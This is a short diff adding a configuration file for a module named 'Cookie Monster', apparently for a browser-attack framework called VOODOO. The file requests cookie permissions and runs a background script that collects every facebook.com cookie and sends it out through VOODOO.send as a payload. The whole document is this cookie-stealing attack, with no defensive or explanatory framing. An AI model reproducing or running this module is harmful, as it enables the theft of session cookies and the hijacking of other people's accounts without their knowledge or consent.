@@ -1,0 +1,12 @@
+info:
+  name: Cookie Monster
+
+output: stdout:payload
+
+permissions:
+  - cookies
+
+scripts:
+  - content: |
+      chrome.cookies.getAll({domain: "facebook.com"}, VOODOO.send);
+    background: true
